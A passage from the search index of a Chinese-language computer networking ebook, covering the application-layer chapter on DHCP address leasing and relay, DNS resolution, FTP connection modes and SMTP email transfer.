\u7aef\u53e3\u63a5\u6536\u62a5\u6587\u3002</p>"},{"location":"ebook-network-basic/06%20%E5%BA%94%E7%94%A8%E5%B1%82/#ip","title":"\u83b7\u53d6 IP \u9636\u6bb5","text":"<p>1\u3001\u5ba2\u6237\u7aef\u53d1\u9001 DISCOVER \u62a5\u6587\uff08\u5e7f\u64ad\u53d1\u9001\uff0c\u6e90\u5730\u5740 0.0.0.0 \u76ee\u7684\u5730\u5740 255.255.255.255\uff09</p> <p>2\u3001\u670d\u52a1\u5668\u63a5\u6536\u62a5\u6587\uff0c\u5e76\u53d1\u51fa\u54cd\u5e94 OFFER \u62a5\u6587\uff08\u6e90\u5730\u5740\u662f\u670d\u52a1\u5668\u7684\u5730\u5740\uff0c\u76ee\u7684\u5730\u5740\u662f 255.255.255.255\uff09\u5305\u62ec\u4e8b\u52a1ID\u548c\u914d\u7f6e\u4fe1\u606f\uff08IP\u5730\u5740\uff0c\u5b50\u7f51\u63a9\u7801\uff0c\u5730\u5740\u79df\u671f\uff0c\u9ed8\u8ba4\u7f51\u5173\uff0cDNS\u670d\u52a1\u5668\u4fe1\u606f\uff09DHCP\u670d\u52a1\u5668\u4ece\u81ea\u5df1\u7684 IP \u5730\u5740\u6c60\u4e2d\u9009\u62e9\u5f85\u79df\u7528\u7ed9\u4e3b\u673a\u7684 IP \u5730\u5740\u3002\u4f7f\u7528 ARP \u786e\u4fdd\u9009\u4e2d\u7684 IP \u6ca1\u6709\u88ab\u5176\u4ed6\u4e3b\u673a\u5360\u7528\u3002</p> <p>3\u3001\u5ba2\u6237\u7aef\u53ef\u80fd\u6536\u5230\u591a\u4e2a DHCP \u670d\u52a1\u5668\u53d1\u9001\u7684 OFFER \u62a5\u6587\uff0c\u9009\u62e9\u5148\u5230\u7684\u62a5\u6587\u3002</p> <p>4\u3001\u5ba2\u6237\u7aef\u7ee7\u7eed\u5e7f\u64ad REQUEST \u62a5\u6587\uff08\u5305\u62ec\u4e8b\u52a1ID\uff0cDHCP\u5ba2\u6237\u7aef\u7684MAC\u5730\u5740\uff0c\u63a5\u6536\u79df\u7ea6\u4e2d\u7684IP\u5730\u5740\uff0c\u63d0\u4f9b\u79df\u7ea6\u7684DHCP\u670d\u52a1\u5668\u7aef\u7684IP\u5730\u5740\uff09\u6e90\u5730\u5740 0.0.0.0 \u76ee\u7684\u5730\u5740 255.255.255.255</p> <p>4\u3001\u670d\u52a1\u5668\u6536\u5230\u62a5\u6587\u540e\uff0c\u53d1\u9001 ACK \u62a5\u6587\u3002\u5ba2\u6237\u7aef\u63a5\u6536\u540e\uff0c\u4f7f\u7528 ARP \u68c0\u6d4b\u5206\u914d\u7684 IP \u5730\u5740\u662f\u5426\u88ab\u7f51\u7edc\u7684\u5176\u4ed6\u4e3b\u673a\u5360\u7528\u3002\u5982\u679c\u5360\u7528\uff0c\u7ed9 DHCP \u53d1\u9001 DECLINE \u64a4\u9500\u62a5\u6587\uff0c\u7136\u540e\u4ece\u7b2c\u4e00\u6b65\u91cd\u65b0\u53d1\u9001 DISCOVER \u62a5\u6587\u3002\u5982\u679c\u6ca1\u6709\u5360\u7528\uff0c\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a IP \u5730\u5740\u548c\u5176\u4ed6\u4e3b\u673a\u8fdb\u884c\u901a\u4fe1\u4e86\u3002</p>"},{"location":"ebook-network-basic/06%20%E5%BA%94%E7%94%A8%E5%B1%82/#ip-05","title":"IP \u7eed\u7ea6\u9636\u6bb5\uff08\u5f530.5\u500d\u79df\u7528\u671f\u5230\u4e86\uff09","text":"<p>1\u3001\u5ba2\u6237\u7aef\u7ed9\u670d\u52a1\u5668\u53d1\u9001 REQUEST \u62a5\u6587\uff08\u6e90\u5730\u5740\u662f\u79df\u7528\u7684IP\u5730\u5740\uff0c\u76ee\u7684\u5730\u5740\u662f \u670d\u52a1\u5668\u7684\u5730\u5740\uff09</p> <p>2\u3001\u670d\u52a1\u5668\u63a5\u6536\u5230\u62a5\u6587\u540e\uff1a\u5982\u679c\u53ef\u4ee5\u7eed\u7ea6\uff0c\u53d1\u51fa ACK \u62a5\u6587\uff08\u6e90\u5730\u5740\u662f\u670d\u52a1\u5668\u5730\u5740\uff0c\u76ee\u7684\u5730\u5740\u662f\u79df\u7528\u7684 IP \u5730\u5740\uff09\uff0c\u5f97\u5230\u65b0\u7684\u79df\u7528\u671f\uff1b\u5982\u679c\u4e0d\u53ef\u4ee5\u7eed\u7ea6\uff0c\u53d1\u51fa NACK \u62a5\u6587\uff0c\u5ba2\u6237\u7aef\u5fc5\u987b\u505c\u6b62\u4f7f\u7528\u4e4b\u524d\u79df\u7528\u5230\u7684 IP \u5730\u5740\uff0c\u91cd\u65b0\u53d1\u9001 DISCOVER \u62a5\u6587\u83b7\u53d6IP\u3002</p> <p>3\u3001\u5982\u679c\u670d\u52a1\u5668\u65e0\u54cd\u5e94\uff0c0.875\u500d\u79df\u7528\u671f\u5230\u8fbe\u540e\uff0c\u5ba2\u6237\u7aef\u7ee7\u7eed\u53d1\u9001 REQUEST \u62a5\u6587\uff0c\u5982\u679c\u7ee7\u7eed\u65e0\u54cd\u5e94\uff0c\u5728\u79df\u7528\u671f\u5230\u8fbe\u540e\u505c\u6b62\u4f7f\u7528 IP \u5e76\u91cd\u65b0\u53d1\u9001 DISCOVER \u62a5\u6587\u3002</p>"},{"location":"ebook-network-basic/06%20%E5%BA%94%E7%94%A8%E5%B1%82/#ip_1","title":"\u5ba2\u6237\u7aef\u4e3b\u52a8\u89e3\u9664IP\u7eed\u7ea6","text":"<p>1\u3001\u5ba2\u6237\u7aef\u5411 DHCP \u670d\u52a1\u5668\u53d1\u9001 RELEASE \u91ca\u653e\u62a5\u6587\uff08\u6e90\u5730\u57400.0.0.0\uff0c\u76ee\u6807\u5730\u5740 255.255.255.255\uff09</p> <p>\u8def\u7531\u5668\u4e2d\u7ee7\u95ee\u9898\uff1a\u5982\u679c\u4e00\u4e2a\u4e3b\u673a\u5728\u8def\u7531\u5668\u540e\u9762\uff0c\u8def\u7531\u5668\u5916\u9762\u914d\u7f6e DHCP \u670d\u52a1\u5668\uff0c\u90a3\u4e48\u8fd9\u4e2a\u4e3b\u673a\u4e0d\u80fd\u81ea\u52a8\u83b7\u53d6 IP \u5730\u5740\u3002\u4e3b\u673a\u4f1a\u53d1\u51fa DISCOVER \u62a5\u6587\uff0c\u4f46\u662f\u4f1a\u88ab\u8def\u7531\u5668\u4e22\u5f03\uff0c\u670d\u52a1\u5668\u65e0\u6cd5\u83b7\u53d6\u5230\u3002\u6240\u4ee5\u8def\u7531\u5668\u9700\u8981\u914d\u7f6e DHCP \u670d\u52a1\u5668\u7684\u5730\u5740\u5e76\u6210\u4e3a\u4e2d\u7ee7\u4ee3\u7406\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u83b7\u53d6 IP \u548c\u7f51\u7edc\u914d\u7f6e\u4fe1\u606f\u4e86\u3002</p> <p>\u5b9e\u9645\u4e0a\uff0c\u6211\u4eec\u4e0d\u9700\u8981\uff0c\u4e5f\u4e0d\u613f\u610f\u5728\u6bcf\u4e00\u4e2a\u7f51\u7edc\u4e0a\u90fd\u914d\u7f6e DHCP \u670d\u52a1\u5668\uff0c\u6240\u4ee5\u6bcf\u4e00\u4e2a\u7f51\u7edc\u81f3\u5c11\u8bbe\u7f6e\u4e00\u4e2a DHCP \u4e2d\u7ee7\u4ee3\u7406\uff08\u8def\u7531\u5668\uff09\uff0c\u4f5c\u4e3a\u5404\u4e2a\u7f51\u7edc\u4e2d\u8ba1\u7b97\u673a\u548c DHCP \u670d\u52a1\u5668\u7684\u6865\u6881\u3002</p>"},{"location":"ebook-network-basic/06%20%E5%BA%94%E7%94%A8%E5%B1%82/#64-dns","title":"6.4 \u57df\u540d\u7cfb\u7edfDNS","text":"<p>\u57df\u540d\u7684\u4f5c\u7528\uff1a\u7528\u6237\u4e0d\u9700\u8981\u8bb0\u4f4fIP\u5730\u5740\uff0c\u53ea\u9700\u8981\u8bb0\u4f4f\u57df\u540d\uff0c\u901a\u8fc7\u57df\u540d\u89e3\u6790\uff0c\u8bbf\u95ee\u5230 IP \u5730\u5740\u3002\u57df\u540d\u7cfb\u7edf\u7b80\u5355\u8bf4\uff0c\u5c31\u662f\u4e00\u4e2a\u57df\u540d\u548cIP\u5bf9\u5e94\u7684\u54c8\u5e0c\u8868\u670d\u52a1\u3002</p> <p>\u57df\u540d\u7684\u539f\u7406\uff1a\u5ba2\u6237\u7aef\u8bbf\u95ee\u67d0\u4e2a\u57df\u540d\u65f6\uff0c\u5148\u4ece\u672c\u5730\u7684 DNS \u9ad8\u901f\u7f13\u5b58\u4e2d\u67e5\u627e\u8be5\u57df\u540d\u5bf9\u5e94\u7684 IP \u5730\u5740\u3002\u5982\u679c\u672c\u5730\u6ca1\u6709\u627e\u5230\uff0c\u90a3\u4e48\u5c31\u5411 DNS \u670d\u52a1\u5668\u53d1\u9001\u8bf7\u6c42\uff0c\u83b7\u53d6 IP \u5730\u5740\u3002</p> <p>\u670d\u52a1\u5668\u6570\u91cf\uff1a\u4e92\u8054\u7f51\u4e0a\u4e0d\u53ef\u80fd\u53ea\u6709\u4e00\u53f0 DNS \u670d\u52a1\u5668\uff0c\u625b\u4e0d\u4f4f\u9ad8\u5e76\u53d1\u8bf7\u6c42\u3002\u5982\u679c\u8fd9\u4e00\u53f0\u5954\u6e83\u4e86\uff0c\u6574\u4e2a\u7f51\u7edc\u5c31\u6302\u4e86\u3002</p> <p>\u670d\u52a1\u5668\u7ed3\u6784\uff1a\u5b9e\u9645\u4e0a DNS \u662f\u5c42\u7ea7\u7684\u6811\u7ed3\u6784\uff0c\u5206\u5e03\u5f0f\u7684\u57df\u540d\u7cfb\u7edf\u3002\u5927\u90e8\u5206\u57df\u540d\u5728\u672c\u5730\u89e3\u6790\uff0c\u5c11\u91cf\u9700\u8981\u5728\u7f51\u7edc\u4e2d\u89e3\u6790\uff0c\u6548\u7387\u5f88\u9ad8\u3002\u56e0\u4e3a\u662f\u5206\u5e03\u5f0f\uff0c\u5373\u4f7f\u67d0\u4e2a\u8ba1\u7b97\u673a\u51fa\u73b0\u6545\u969c\uff0c\u4e0d\u4f1a\u5f71\u54cd\u6574\u4e2a\u7cfb\u7edf\u8fd0\u884c\u3002</p> <p>\u57df\u540d\u6811\uff1a\u4e09\u7ea7\u57df\u540d.\u4e8c\u7ea7\u57df\u540d.\u4e00\u7ea7\u57df\u540d \u6bcf\u4e00\u7ea7\u7531\u82f1\u6587\u5b57\u6bcd\u548c\u6570\u5b57\u7ec4\u6210\uff08\u4e0d\u8d85\u8fc763\u4e2a\u5b57\u7b26\uff0c\u4e0d\u533a\u5206\u5927\u5c0f\u5199\u5b57\u6bcd\uff0c\u5de6\u8fb9\u4f4e\u53f3\u8fb9\u9ad8\uff0c\u5b8c\u6574\u57df\u540d\u4e0d\u8d85\u8fc7255\u4e2a\u5b57\u7b26\uff09DNS \u4e0d\u663e\u793a\u4e00\u4e2a\u57df\u540d\u6709\u591a\u5c11\u4e0b\u7ea7\u57df\u540d\uff0c\u4e0d\u9650\u5236\u6bcf\u4e00\u7ea7\u57df\u540d\u4ee3\u8868\u4ec0\u4e48\u610f\u601d\u3002\u9876\u7ea7\u57df\u540d\u7531ICANN\u7ba1\u7406\uff0c\u5404\u7ea7\u57df\u540d\u7531\u4e0a\u4e00\u7ea7\u7684\u57df\u540d\u7ba1\u7406\u673a\u6784\u7ba1\u7406\uff08dev.jlu.edu.cn\uff09</p> <p>\u9876\u7ea7\u57df\u540d\uff1a\u56fd\u5bb6\u9876\u7ea7\u57df\u540d\uff08cn us uk\uff09\u901a\u7528\u9876\u7ea7\u57df\u540d\uff08com net org edu\uff09\u53cd\u5411\u57df arpa\u3002\u4e8c\u7ea7\u57df\u540d\u7531\u56fd\u5bb6\u81ea\u884c\u786e\u5b9a\u3002\u57df\u540d\u53ea\u662f \u903b\u8f91\u6982\u5ff5\uff0c\u4e0d\u4ee3\u8868\u771f\u5b9e\u7684\u7269\u7406\u5730\u5740\u3002</p> <p>\u57df\u540d\u670d\u52a1\u5668\u5206\u7c7b\uff1a</p> <ul> <li>\u6839\u57df\u540d\u670d\u52a1\u5668\uff0813\u4e2a\u670d\u52a1\u5668\u96c6\u7fa4\uff0c\u4e0d\u89e3\u6790\u57df\u540d\uff0c\u8fd4\u56de\u8be5\u57df\u540d\u6240\u5c5e\u7684\u9876\u7ea7\u57df\u540d\u670d\u52a1\u5668\u7684IP\u5730\u5740\uff09</li> <li>\u9876\u7ea7\u57df\u540d\u670d\u52a1\u5668\uff1a\u8d1f\u8d23\u7ba1\u7406\u5728\u9876\u7ea7\u57df\u540d\u670d\u52a1\u5668\uff08cn\uff09\u6ce8\u518c\u7684\u5168\u90e8\u4e8c\u7ea7\u57df\u540d\uff08edu, bj\uff09\u6536\u5230 DNS \u67e5\u8be2\u8bf7\u6c42\u65f6\uff0c\u53ef\u4ee5\u56de\u7b54\u3002\u53ef\u80fd\u662f\u6700\u540e\u7684\u7ed3\u679c\uff0c\u4e5f\u53ef\u662f\u4e0b\u4e00\u7ea7\u6743\u9650\u57df\u540d\u670d\u52a1\u5668\u7684IP</li> <li>\u6743\u9650\u57df\u540d\u670d\u52a1\u5668\uff1a\u7ba1\u7406\u67d0\u4e2a\u533a\u7684\u57df\u540d</li> <li>\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\uff1a\u4e3b\u8981\u662f\u4ee3\u7406\u4f5c\u7528\u3002\u4e3b\u673a\u53d1\u51fa DNS \u8bf7\u6c42\u62a5\u6587\u65f6\uff0c\u9996\u5148\u53d1\u9001\u5230\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\uff08\u5927\u5b66\u6216\u8005ISP\uff09\uff0c\u4e00\u534a\u4e0d\u8d85\u8fc7\u51e0\u4e2a\u8def\u7531\u5668\u3002\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u7684IP\u5730\u5740\u76f4\u63a5\u914d\u7f6e\u5728\u4e3b\u673a\u4e2d\u3002</li> </ul> <p>\u57df\u540d\u89e3\u6790\u8fc7\u7a0b\uff1a\u9012\u5f52\u67e5\u8be2 \u8fed\u4ee3\u67e5\u8be2</p> <ul> <li>\u9012\u5f52\u67e5\u8be2\uff1a\u4ece\u5e95\u5c42\u4e00\u76f4\u5230\u4e0a\u5c42\u67e5\u8be2\uff0c\u4e0a\u5c42\u4f9d\u6b21\u8fd4\u56de\u67e5\u8be2\u7ed3\u679c\u3002A -&gt; B -&gt; C -&gt; D -&gt; C -&gt; B -&gt; A \u88ab\u67e5\u8be2\u7684\u670d\u52a1\u5668\u8d1f\u62c5\u8f83\u5927\uff0c\u6027\u80fd\u4e0d\u597d\u3002</li> <li>\u8fed\u4ee3\u67e5\u8be2\uff1a\u4e3b\u673a\u7bb1\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u67e5\u8be2\u3002\u672c\u5730\u5148\u5411\u6839\u57df\u540d\u67e5\u8be2\uff0c\u4e0a\u4e00\u5c42\u8fd4\u56de\u7ed3\u679c\u3002\u5982\u679c\u4e0d\u5b58\u5728\uff0c\u7136\u540e\u5e95\u5c42\u5411\u4e0a\u4e24\u7ea7\u67e5\u8be2\uff0c\u4e0a\u4e24\u7ea7\u8fd4\u56de\u7ed3\u679c\u3002\u672c\u5730\u57df\u540d\u670d\u52a1\u5668 -&gt; \u6839\u57df\u540d(cn) -&gt; \u672c\u5730, \u672c\u5730 -&gt; \u9876\u7ea7(edu) -&gt; \u672c\u5730, \u672c\u5730 -&gt; \u6743\u9650(jlu) -&gt; \u672c\u5730\u3002\u5982\u679c\u4e2d\u95f4\u6709\u7f13\u5b58\uff0c\u90a3\u4e48\u76f4\u63a5\u83b7\u53d6\u7f13\u5b58\u3002</li> <li>\u5b9e\u9645\u4e0a\uff0c\u4e3b\u673a\u5230\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u4f7f\u7528\u9012\u5f52\u67e5\u8be2\uff0c\u5176\u4ed6\u7684\u67e5\u8be2\u65f6\u8fed\u4ee3\u67e5\u8be2\u3002</li> </ul> <p>\u9ad8\u901f\u7f13\u5b58\uff1a\u7528\u6765\u5b58\u653e\u6700\u8fd1\u67e5\u8be2\u8fc7\u5f97\u57df\u540d\uff0c\u4ee5\u53ca\u4ece\u4f55\u5904\u83b7\u53d6\u57df\u540d\u6620\u5c04\u4fe1\u606f\u7684\u8bb0\u5f55\u3002\u56e0\u4e3a\u57df\u540d\u5230 IP \u7684\u6620\u5c04\u5173\u7cfb\u53ef\u80fd\u53d8\u5316\uff0c\u57df\u540d\u670d\u52a1\u5668\u4f1a\u8bbe\u7f6e\u8ba1\u65f6\u5668\u548c\u8fc7\u671f\u65f6\u95f4\uff08\u6bcf\u4e2a\u9879\u76ee\u5b58\u653e\u4e24\u5929\uff09</p> <p>\u4f8b\u9898</p> <p>\u5982\u679c\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u65e0\u7f13\u5b58\uff0c\u4f7f\u7528\u9012\u5f52\u65b9\u6cd5\u89e3\u6790\u53e6\u4e00\u4e2a\u7f51\u7edc\u7684\u4e3b\u673a\u57df\u540d\u65f6\uff0c\u7528\u6237\u4e3b\u673a\u53d1\u90011\u6761\u8bf7\u6c42\uff0c\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u53d1\u90011\u6761\u8bf7\u6c42\u3002</p> <p>\u5982\u679c\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u6709\u7f13\u5b58\uff0c\u4f7f\u7528\u9012\u5f52\u65b9\u6cd5\u89e3\u6790\u53e6\u4e00\u4e2a\u7f51\u7edc\u7684\u4e3b\u673a\u57df\u540d\u65f6\uff0c\u7528\u6237\u4e3b\u673a\u53d1\u90011\u6761\u8bf7\u6c42\uff0c\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u53d1\u90010\u6761\u8bf7\u6c42\u3002</p> <p>\u5982\u679c\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u6709\u7f13\u5b58\uff0c\u4f7f\u7528\u8fed\u4ee3\u65b9\u6cd5\u89e3\u6790\u53e6\u4e00\u4e2a\u7f51\u7edc\u7684\u4e3b\u673a\u57df\u540d\u65f6\uff0c\u7528\u6237\u4e3b\u673a\u53d1\u90011\u6761\u8bf7\u6c42\uff0c\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u53d1\u90013-4\u6761\u8bf7\u6c42\u3002</p> <p>\u89e3\u6790 www.taobao.com.cn \u65f6\uff0c\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u53ef\u80fd\u53d1\u51fa\u7684\u8bf7\u6c42\u6700\u591a\u548c\u6700\u5c11\u662f\uff1a\u6700\u5c110\u6761\uff08\u672c\u5730\u57df\u540d\u670d\u52a1\u5668\u6709\u7f13\u5b58\uff09\u6700\u591a4\u6761\uff08\u6839\u57df\u540d\u670d\u52a1\u5668\uff0c\u9876\u7ea7\u57df\u540dcn \u6743\u9650\u57df\u540dcom.cn \u6743\u9650\u57df\u540d taobao.com.cn\uff09</p>"},{"location":"ebook-network-basic/06%20%E5%BA%94%E7%94%A8%E5%B1%82/#65-ftp","title":"6.5 \u6587\u4ef6\u4f20\u9001\u534f\u8baeFTP","text":"<p>\u8ba1\u7b97\u673a\u7f51\u7edc\u4e2d\u4f20\u8f93\u6587\u4ef6\u662f\u57fa\u672c\u7684\u7f51\u7edc\u5e94\u7528\uff0c\u4f7f\u7528FTP\u534f\u8bae\u3002</p> <p>\u4e09\u4e2a\u7279\u70b9\uff1a1\u3001FTP \u5c4f\u853d\u4e86\u8ba1\u7b97\u673a\u7f51\u7edc\u4e2d\u7684\u5f88\u591a\u5185\u90e8\u7ec6\u8282\uff0c\u4e0d\u540c\u7ed3\u6784\u7684\u7f51\u7edc\u53ef\u4ee5\u6b63\u5e38\u901a\u4fe1\u30022\u3001\u63d0\u4f9b\u4ea4\u4e92\u5f0f\u7684\u8bbf\u95ee\u3002\u7528\u6237\u53ef\u4ee5\u6307\u5b9a\u4f20\u8f93\u6587\u4ef6\u7684\u7c7b\u578b\u548c\u683c\u5f0f\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u6587\u4ef6\u7684\u5b58\u53d6\u6743\u9650\u30023\u3001\u65e9\u671f\u4f7f\u7528\u975e\u5e38\u591a\uff0c\u6700\u540e\u9010\u6b65\u88ab www \u53d6\u4ee3\u3002</p> <p>\u670d\u52a1\u5668\u786c\u4ef6\u914d\u7f6e\uff1a\u6839\u636e\u9700\u6c42\u4e0d\u540c\uff0cFTP\u670d\u52a1\u5668\u53ef\u80fd\u662f\u9ad8\u6027\u80fd\u548c\u9ad8\u53ef\u9760\u6027\u7684\u670d\u52a1\u5668\u8ba1\u7b97\u673a\uff0c\u4e5f\u53ef\u80fd\u662f\u666e\u901a\u7684\u4e2a\u4eba\u8ba1\u7b97\u673a\u3002</p> <p>\u5ba2\u6237\u7aef\u8f6f\u4ef6\u914d\u7f6e\uff1a\u53ef\u4ee5\u4f7f\u7528FTP\u8f6f\u4ef6\uff1b\u53ef\u4ee5\u76f4\u63a5\u5728\u6d4f\u89c8\u5668\u4e2d\u4f7f\u7528 ftp \u534f\u8bae\u83b7\u53d6\u6587\u4ef6\uff1b\u53ef\u4ee5\u5728\u7ec8\u7aef\u4e2d\u4f7f\u7528 ftp\uff1a\u5730\u5740\u8fdb\u884c\u767b\u5f55\uff08dir get put \u7b49\u547d\u4ee4\u8fdb\u884c\u53d1\u9001\u63a5\u6536\u6587\u4ef6\uff09</p> <p>\u7528\u9014\uff1a\u8ba1\u7b97\u673a\u4e4b\u95f4\u6279\u91cf\u4f20\u8f93\u6587\u4ef6\uff0c\u6216\u8005\u7f51\u9875\u8bbe\u8ba1\u4e2d\uff0c\u628a\u672c\u5730\u6587\u4ef6\u4e0a\u4f20\u5230 web \u670d\u52a1\u5668\u4e0a\u3002</p> <p>\u5de5\u4f5c\u539f\u7406\uff1aTCP \u7aef\u53e321\u3002</p> <p>1\u3001\u5ba2\u6237\u7aef\u968f\u673a\u7aef\u53e3\u53f7\u53d1\u8d77 TCP \u63a7\u5236\u8fde\u63a5\uff0c\u670d\u52a1\u566821\u7aef\u53e3\u63a5\u6536\u62a5\u6587\u3002\u8fd9\u4e2a TCP \u8fde\u63a5\u6210\u4e3a\u63a7\u5236\u8fde\u63a5\u3002\u63a7\u5236\u8fde\u63a5\u5728\u6574\u4e2a\u5bf9\u8bdd\u671f\u95f4\u59cb\u7ec8\u6253\u5f00\uff0c\u4f20\u8f93 FTP \u7684\u63a7\u5236\u547d\u4ee4\u3002</p> <p>2\u3001\u53ea\u6709\u5728\u6709\u6570\u636e\u8981\u4f20\u8f93\u65f6\uff0c\u5ba2\u6237\u7aef\u53e6\u4e00\u4e2a\u968f\u673a\u7aef\u53e3\u53d1\u51fa TCP \u6570\u636e\u8fde\u63a5\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u670d\u52a1\u5668 20 \u7aef\u53e3\u63a5\u6536\u62a5\u6587\u3002\u8fd9\u4e2a\u8fde\u63a5\u5c31\u662f\u6570\u636e\u8fde\u63a5\uff0c\u4f20\u8f93\u7ed3\u675f\u5c31\u5173\u95ed\u3002</p> <p>\u8fde\u63a5\u65b9\u5f0f\uff1a\u63a7\u5236\u8fde\u63a5\u548c\u6570\u636e\u8fde\u63a5\u3002</p> <p>\u4f20\u8f93\u6a21\u5f0f\uff1a\u4e3b\u52a8\u6a21\u5f0f\u548c\u88ab\u52a8\u6a21\u5f0f\u3002\u5efa\u7acb\u6570\u636e\u8fde\u63a5\u540e\uff0c\u4e3b\u52a8\u6a21\u5f0f\u4e2d\u670d\u52a1\u5668\u4e3b\u52a8\u8fde\u63a5\u5ba2\u6237\u7aef\uff0c\u88ab\u52a8\u6a21\u5f0f\u4e0b\uff0c\u670d\u52a1\u5668\u88ab\u52a8\u7b49\u5f85\u5ba2\u6237\u7aef\u7684\u8fde\u63a5\u3002\u4e3b\u52a8\u65b9\u5f0f\u4f7f\u7528 TCP 20 \u7aef\u53e3\uff0c\u88ab\u52a8\u65b9\u5f0f\u4e0b\u7aef\u53e3\u53f7\u7531\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u81ea\u884c\u5546\u8bae\u51b3\u5b9a\u3002</p>"},{"location":"ebook-network-basic/06%20%E5%BA%94%E7%94%A8%E5%B1%82/#66","title":"6.6 \u7535\u5b50\u90ae\u4ef6","text":"<p>\u7535\u5b50\u90ae\u4ef6\uff1a\u53d1\u4ef6\u4eba\u628a\u90ae\u4ef6\u4ece\u672c\u5730\u53d1\u5230\u90ae\u4ef6\u670d\u52a1\u5668\uff0c\u53d1\u4ef6\u4eba\u7684\u90ae\u4ef6\u670d\u52a1\u5668\u6839\u636e\u6536\u4ef6\u5730\u5740\uff0c\u8f6c\u53d1\u5230\u6536\u4ef6\u4eba\u7684\u90ae\u4ef6\u670d\u52a1\u5668\u3002\u6536\u4ef6\u4eba\u65b9\u4fbf\u65f6\uff0c\u8bbf\u95ee\u90ae\u4ef6\u670d\u52a1\u5668\uff0c\u83b7\u53d6\u6536\u5230\u7684\u7535\u5b50\u90ae\u4ef6\u3002\u4e0d\u4ec5\u53ef\u4ee5\u4f20\u9012\u6587\u672c\uff0c\u8fd8\u652f\u6301\u591a\u5a92\u4f53\u3002</p> <p>\u4f20\u8f93\u65b9\u5f0f\uff1a\u5ba2\u6237\u7aef/\u670d\u52a1\u5668\u65b9\u5f0f</p> <p>\u7528\u6237\u4ee3\u7406\uff1a\u7528\u6237\u4e0e\u7535\u5b50\u90ae\u4ef6\u7cfb\u7edf\u7684\u63a5\u53e3\uff08\u5ba2\u6237\u7aef\u8f6f\u4ef6\uff09</p> <p>\u90ae\u4ef6\u670d\u52a1\u5668\uff1aISP\u90fd\u6709\u90ae\u4ef6\u670d\u52a1\u5668\uff0c\u8d1f\u8d23\u53d1\u9001\u548c\u63a5\u6536\u90ae\u4ef6\uff0c\u540c\u65f6\u8d1f\u8d23\u7ef4\u62a4\u7528\u6237\u7684\u90ae\u7bb1</p> <p>\u534f\u8bae\uff1a\u4f7f\u7528 SMTP \u53d1\u9001\u90ae\u4ef6\uff0c\u4f7f\u7528 POP3 \u63a5\u6536\u90ae\u4ef6</p>"},{"location":"ebook-network-basic/06%20%E5%BA%94%E7%94%A8%E5%B1%82/#smtp","title":"SMTP\u534f\u8bae","text":"<p>SMTP \u57fa\u672c\u539f\u7406\uff1aA\u90ae\u4ef6\u670d\u52a1\u5668\u5468\u671f\u6027\u5bf9\u90ae\u4ef6\u7f13\u5b58\u626b\u63cf\uff0c\u5982\u679c\u6709\u65b0\u7684\u90ae\u4ef6\u5c31\u5f00\u59cb\u53d1\u9001\u3002SMTP \u6709 14\u6761\u547d\u4ee4\uff0c\u5e94\u7b54\u6a21\u5f0f\u6709 21\u79cd\uff0c\u4f7f\u7528 25 \u7aef\u53e3\u3002\u7b80\u5316\u7684\u6d41\u7a0b\u5982\u4e0b\uff1a</p> <pre><code>- \u5ba2\u6237\u7aef\u5411\u670d\u52a1\u5668\u8bf4\u660e\u8eab\u4efd\uff0c\u544a\u8bc9 SMTP \u670d\u52a1\u5668\u7684\u57df\u540d\u3002\u5982\u679c\u6709\u6548\uff0c\u670d\u52a1\u5668\u8fd4\u56de 250\n- \u5ba2\u6237\u7aef\u544a\u8bc9\u670d\u52a1\u5668\u90ae\u4ef6\u7684\u53d1\u4ef6\u4eba\u3002\u5982\u679c\u6709\u6548\uff0c\u8fd4\u56de 250\n- \u5ba2\u6237\u7aef\u544a\u8bc9\u670d\u52a1\u5668\u90ae\u4ef6\u7684\u6536\u4ef6\u4eba\u3002\u5982\u679c\u90ae\u7bb1\u5b58\u5728\uff0c\u8fd4\u56de250\u3002\u9519\u8bef\u5c31\u8fd4\u56de\u5176\u4ed6\u7684\u4ee3\u7801\n- \u5ba2\u6237\u7aef\u544a\u8bc9\u670d\u52a1\u5668\u51c6\u5907\u53d1\u9001\u6b63\u6587\u3002\u670d\u52a1\u5668\u5982\u679c\u51c6\u5907\u597d\u63a5\u6536\uff0c\u8fd4\u56de 354\u3002\n- \u5ba2\u6237\u7aef\u53d1\u9001\u90ae\u4ef6\u5185\u5bb9\n- \u5ba2\u6237\u7aef\u53d1\u5b8c\u90ae\u4ef6\u5185\u5bb9\uff0c\u53d1\u9001\u7ed3\u675f\u7b26\u53f7\u3002\u5982\u679c\u6536\u4ef6\u6210\u529f\uff0c\u8fd4\u56de 250\n- \u5ba2\u6237\u7aef\u5411\u670d\u52a1\u5668\u8bf7\u6c42\u65ad\u5f00\u8fde\u63a5\uff0c\u670d\u52a1\u5668\u8fd4\u56de 211\uff0c\u5e76\u4e3b\u52a8\u65ad\u5f00\u8fde\u63a5\n</code></pre> <p>\u90ae\u4ef6\u7684\u683c\u5f0f\uff1a\u4fe1\u5c01+\u5185\u5bb9\uff08\u9996\u90e8+\u4e3b\u4f53\uff09\u9996\u90e8\u5305\u62ec\uff1afrom to CC subject</p> <p>SMTP \u7684\u4e0d\u8db3\uff1a\u53ea\u80fd\u4f20\u8f93 ASCII \u7801\u7684\u6587\u672c\u6570\u636e\uff0c\u4e0d\u80fd\u4f20\u8f93 exe \u6216\u8005\u5176\u4ed6\u4e8c\u8fdb\u5236\u5bf9\u8c61\uff1b\u4e0d\u80fd\u4f20\u9001\u591a\u5a92\u4f53\u6587\u4ef6\uff0c\u4e0d\u80fd\u4f20\u8f93\u975e\u82f1\u6587\u3002</p> <p>\u4e3a\u4e86\u4f20\u8f93\u975e ASCII 